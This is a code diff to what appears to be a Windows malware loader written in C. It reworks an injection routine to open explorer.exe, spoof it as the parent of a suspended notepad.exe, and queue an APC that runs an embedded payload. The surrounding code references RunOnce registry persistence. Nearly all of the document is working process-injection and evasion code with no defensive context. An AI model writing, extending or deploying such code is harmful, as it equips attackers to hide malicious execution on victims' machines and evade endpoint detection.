@@ -65,20 +65,38 @@ BOOL InstallRunOncePersistence(LPCWSTR exePath) {
 }
 
 int remInj() {
-    DWORD pid = findPID();
-    if (pid != 0) {
-        printf("Found explorer.exe with PID: %d\n", pid);
-        processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-    }
-    else if (CreateProcess(L"C:\\Windows\\notepad.exe", NULL, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &info, &processInfo) != 0) {
-        pid = findPID();
-        printf("Created notepad.exe with PID: %d\n", pid);
-        processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-    }
-    else {
-        printf("Failed to find or create notepad.exe\n");
+    DWORD parentPID = findExplorerPID();
+    if (parentPID == 0) {
+        printf("Failed to find explorer.exe\n");
         return 0;
     }
+
+    HANDLE parentProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, parentPID);
+    if (parentProcessHandle == NULL) {
+        printf("Failed to open parent process\n");
+        return 0;
+    }
+
+    STARTUPINFOEXW si;
+    PROCESS_INFORMATION pi;
+    SIZE_T attributeSize;
+
+    ZeroMemory(&si, sizeof(STARTUPINFOEXW));
+    si.StartupInfo.cb = sizeof(STARTUPINFOEXW);
+
+    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
+    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
+    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);
+
+    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parentProcessHandle, sizeof(HANDLE), NULL, NULL);
+
+    if (!CreateProcessW(L"C:\\Windows\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi)) {
+        printf("Failed to create process\n");
+        CloseHandle(parentProcessHandle);
+        return 0;
+    }
+
+    processHandle = pi.hProcess;
 
     NTSTATUS status;
     SIZE_T allocSize = sizeof(payload);
@@ -112,7 +130,12 @@ int remInj() {
         printf("Failed to queue APC\n");
     }
 
+    ResumeThread(pi.hThread);
     NtClose(processHandle);
+    NtClose(pi.hThread);
+    CloseHandle(parentProcessHandle);
+    DeleteProcThreadAttributeList(si.lpAttributeList);
+    HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
 
     return 0;
 }
